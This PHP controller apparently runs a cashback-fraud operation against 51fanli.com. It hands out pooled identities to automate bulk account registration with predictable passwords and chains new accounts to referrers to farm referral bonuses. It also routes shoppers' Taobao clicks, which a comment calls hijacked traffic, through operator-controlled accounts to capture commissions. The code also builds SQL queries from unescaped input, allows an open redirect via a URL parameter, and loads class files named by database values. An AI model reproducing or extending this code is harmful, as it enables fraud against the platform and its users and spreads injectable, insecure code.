<?php

class ApiController extends AppController {

	var $name = 'Api';
	var $uses = array('UserFanli', 'UserMizhe', 'UserBind', 'UserCandidate', 'StatJump', 'StatRegFailed', 'StatJump', 'OrderFanli', 'UserBind', 'Task');
	var $layout = 'ajax';

	function alert($target, $info) {

		alert($target, $info);
		if (@$_GET['u']) {
			$this->redirect($_GET['u']);
		}
		else {
			$this->redirect(DEFAULT_ERROR_URL);
		}
	}

	/**
	 * 判断是否有注册任务，如果有，则返回注册url
	 */
	function redirectRegUrl() {

		if (!C('config', 'ENABLE_REG'))
			$this->error();

		$user = $this->UserCandidate->find(array('is_used' => 0));

		//不允许当天IP领取重复的注册任务
		$reg_before = $this->UserCandidate->find("ip = '" . getip() . "' AND ts > '" . date('Y-m-d') . "'", 'id');

		if (!$user) {
			//报警，候选人库不足
			alert('user_candidate', 'empty');
		}

		if ($user && !$reg_before && array_search(getAreaByIp(), C('config', 'REG_EXCLUDE_AREA')) === false) {
			clearTableName($user);

			$rand = rand(3000, 8000);
			$username = $user['username'];
			$email = $user['email'];
			$password = $user['username'] . '0a';

			if ($rand > 500 * date('h')) {
				//让注册时间更加随即，早上6点到下午4点注册几率越来越大
				//$this->_error('reg task not luck');
			}

			//先完成普通注册任务
			if (!overlimit_day('REG_COMMON_PRE_DAY_LIMIT')) {

				$_SESSION['reg_username'] = $user['username'];
				$_SESSION['reg_email'] = $user['email'];
				$_SESSION['reg_parent'] = '';
				$fanli_reg_url = "http://passport.51fanli.com/Reg/ajaxUserReg?useremail={$email}&username={$username}&userpassword={$password}&userpassword2={$password}&skey=&regurl=http://passport.51fanli.com/reg?action=yes&refurl=&t=" . time() . "&_=136398{$rand}";
				$this->_success($fanli_reg_url);
			}
			else {
				//完成推荐注册任务
				if (!overlimit_day('REG_RECOMM_PRE_DAY_LIMIT')) {

					//recommenduid  recommendt
					$parent_data = $this->UserFanli->getPoolRecommender();
					if ($parent_data) {
						clearTableName($parent_data);
						$parent = $parent_data['username'];
						$_SESSION['reg_username'] = $user['username'];
						$_SESSION['reg_email'] = $user['email'];
						$_SESSION['reg_parent'] = $parent;
						$fanli_reg_url = "http://passport.51fanli.com/Reg/ajaxUserReg?useremail={$email}&username={$username}&userpassword={$password}&userpassword2={$password}&skey=&recommendid2={$parent}&recommendt=4&regurl=http://passport.51fanli.com/reg?action=yes&refurl=&t=" . time() . "&_=136398{$rand}";
						$this->_success($fanli_reg_url);
					}
					else {
						//报警，推池不足
						alert('recommender', 'empty');
					}
				}
			}
			unset($_SESSION['reg_username']);
			unset($_SESSION['reg_email']);
			unset($_SESSION['reg_parent']);
			//注册任务全部完成
			$this->_error('reg task complete');
		}
		else {

			//记录失败的注册请求
			$this->StatRegFailed->create();
			$this->StatRegFailed->save(array('ip' => getip(), 'area' => getAreaByIp(), 'date' => date('Y-m-d')));
			$this->_error('can not find user candidate');
		}
	}

	/**
	 * 注册成功后保存注册信息
	 */
	function jsonpRecordRegInfo($status) {

		if ($status) {
			if ($_SESSION['reg_username']) {
				$this->UserCandidate->query("UPDATE user_candidate SET is_used=1, `status`='{$status}', ip='" . getip() . "', area='" . getAreaByIp() . "' WHERE username='{$_SESSION['reg_username']}'");
				$this->UserFanli->create();

				//注册用户成功 status is 10000
				if ($status == '10000') {
					$user = array();
					$user['ip'] = getip();
					$user['area'] = getAreaByIp();
					$user['username'] = $_SESSION['reg_username'];
					$user['email'] = $_SESSION['reg_email'];
					$user['parent'] = @$_SESSION['reg_parent'];
					if ($user['parent'])
						$user['role'] = 3; //被推注册默认就有角色
					$this->UserFanli->save($user);

					//注册任务计数器计数
					if (!$user['parent'])
						overlimit_day_incr('REG_COMMON_PRE_DAY_LIMIT');
					else
						overlimit_day_incr('REG_RECOMM_PRE_DAY_LIMIT');
				}
			}
		}
		unset($_SESSION['reg_username']);
		unset($_SESSION['reg_email']);
		unset($_SESSION['reg_parent']);
		$this->_success();
	}

	/**
	 * 返回跳转JS，选择渠道用户，准备商品信息，转到jump接口
	 * @param type $shop
	 * @param type $my_user
	 * @param type $p_id
	 * @param type $p_price
	 * @param type $p_fanli
	 */
	function getJumpUrlJs($shop, $my_user, $p_id='', $p_price='', $p_fanli='') {

		//TODO取代接口形式获取

		$default_url = $_GET['u'];
		$param['oc'] = $_GET['oc'];
		$my_user = low(urldecode($my_user));
		if(isset($_GET['target']))
			$param['target'] = $_GET['target'];
		else
			$param['target'] = '';

		$param['shop'] = $shop;
		$param['my_user'] = $my_user;
		$param['p_id'] = $p_id;
		$param['p_price'] = $p_price;
		$param['p_fanli'] = $p_fanli;

		$type = '';
		if(@$_GET['su'])
			$_SESSION['source'] = $_GET['su'];

		//判断是否允许运作
		if ($shop && $my_user && C('config', 'ENABLE_JUMP')) {
			$this->set('pass', true);
		}
		else {
			$this->set('pass', false);
		}

		//淘宝以外流量暂时只能走返利网
		//劫持流量只能走返利网

		if ($shop != 'taobao' || @$_GET['su'] == 1) {
			$type = 'fanli';
		}

		if(!$type){

			$j = $this->UserBind->getJumper($my_user);
			//TODO 支持临时渠道切换
			//TODO 支持指定渠道用户跳转，用于测试

			$type = $j['type'];

			//尝试走过mizhe但没有成功过
			if (@$_COOKIE["{$type}_try"] && !@$_COOKIE["{$type}_succ"]){
				alert("{$type} jump", '['. $param['oc'] .']['. getBrowser() .'] today failed');
				$type = false;
			}

			//当认为走渠道没问题时，但容忍度降到0，也不再走mizhe
			if (isset($_COOKIE["{$type}_balance"]) && $_COOKIE["{$type}_balance"] == 0){

				setcookie("{$type}_succ", 0, time() - 360 * 24 * 3600, '/'); //清除米折通道成功标识
				alert("{$type} jump", '['. $param['oc'] .']['. getBrowser() .'] balance become zero');
				$type = false;
			}

			if ($type != 'fanli' && $type) {

				setcookie("{$type}_try", 1, time() + 3 * 24 * 3600, '/'); //每3天允许1次尝试渠道
				$b = myisset(@$_COOKIE["{$type}_balance"], 3);
				$b--;
				if($b<= 0)$b = 0;
				setcookie("{$type}_balance", $b, time() + 7 * 24 * 3600, '/'); //渠道失败容忍次数，减为0时7天不再走渠道
			}
		}
		if(!$type) $type = 'fanli';

		//TODO 返利网也需要用任务模式，先跳转到默认的中转页面
		if($type != 'fanli'){
			$param['jumper_uid'] = $j['userid'];
			$param['jumper_type'] = $type;
			$this->Task->create();
			$this->Task->save($param);
			$this->set('taskid', $this->Task->getLastInsertID());
		}

		$this->set('type', $type);
		$this->set('default_url', $default_url);
		$this->set('p', $param);
	}

	/**
	 * 插件停留在返利网中转页面，请求转换好的跳转链接
	 * @param type $task_id
	 * @param type $link_origin
	 */
	function getTaskResultJs($taskid, $link_origin=''){

		$link = false;

		if($taskid){
			$t_info = $this->Task->find(array('id'=>$taskid));
			clearTableName($t_info);

			if(@$_GET['force'] && $t_info){

				$this->Task->save(array('id'=>$taskid, 'status'=>3));
				$this->set('link', DOMAIN . '/apiJump/jumpForce/' . "{$t_info['shop']}/{$t_info['my_user']}/{$t_info['p_id']}/{$t_info['p_price']}/{$t_info['p_fanli']}?oc={$t_info['oc']}&target={$t_info['target']}");

			}else{

				$type = $t_info['jumper_type'];
				if($t_info){
					clearTableName($t_info);
					require_once MYLIBS . 'jumper' . DS . "jtask_{$type}.class.php";
					$obj_name = 'Jtask'.ucfirst($type);
					$task = new $obj_name($t_info);
					$link = $task->getLink(urldecode($link_origin));
					$link = str_replace('http://', '', $link);
				}

				if(!$link)$link = 'www.taobao.com';
				$this->set('link', $link);

				//TODO 用自己的key来获取
				$data = file_get_contents('http://fun.51fanli.com/api/search/getItemById?pid=' . $t_info['p_id'] . '&is_mobile=2&shoptype=2');
				if ($data) {
					$data = json_decode($data, true);
					$p_title = @$data['data']['title'];
					$p_seller = @$data['data']['shopname'];
				}

				$this->Task->save(array('id'=>$taskid, 'p_seller'=>$p_seller));
				$this->_addStatJump($t_info['shop'], $t_info['jumper_type'], $t_info['my_user'], $t_info['oc'], $t_info['jumper_uid'], $t_info['p_id'], $p_title, $t_info['p_price'], $t_info['p_fanli'], $p_seller);

				//往客户端植入渠道跳转成功标记位
				if(@$_COOKIE[$type.'_succ']){
					setcookie($type.'_succ', 1, time() + 360 * 24 * 3600, '/'); //如果2次都跳渠道成功则变成永久
				}else{
					setcookie($type.'_succ', 1, time() + 1 * 24 * 3600, '/'); //1次成功只有效1天 - 防止有用户碰巧1次成功而已
				}

				//补偿错误容忍度
				$b = intval(@$_COOKIE[$type.'_balance']);
				$b = $b + 2;
				if($b <= 0)$b = 0;
				setcookie($type.'_balance', $b, time() + 7 * 24 * 3600, '/'); //渠道错误容忍次数，减为0时7天不再走渠道
			}
		}
	}

	/**
	 * worker获取一个待处理任务
	 * @return [type] [description]
	 */
	function getWorkerTask(){

		$t_info = $this->Task->find("status=0 AND link_origin!=''", '', 'id asc');
		clearTableName($t_info);
		if($t_info){
			$this->Task->save(array('id'=>$t_info['id'], 'status'=>2));
			$this->_success($t_info, true);
		}else{
			$this->_success(0, true);
		}
	}

	/**
	 * worker结束待处理任务
	 * @return [type] [description]
	 */
	function finishWorkerTask($taskid, $status=1){
		if(!$taskid)$this->_error('任务ID不能为空!');
		$this->Task->save(array('id'=>$taskid, 'status'=>$status));
		$this->_success('ok', true);
	}

	/**
	 * 获取待处理任务总数
	 * @return [type] [description]
	 */
	function getWorkerTaskTotal(){
		$this->_success($this->Task->findCount("status=0 AND link_origin != ''"), true);
	}

	function getJumperInfo($type, $uid){

		$m = 'User'.ucfirst($type);
		$obj = new $m;
		$info = $obj->find(array('userid'=>$uid));
		if($info){
			clearTableName($info);
			$this->_success($info, true);
		}else{
			$this->_error('user do not exist');
		}
	}
}

?>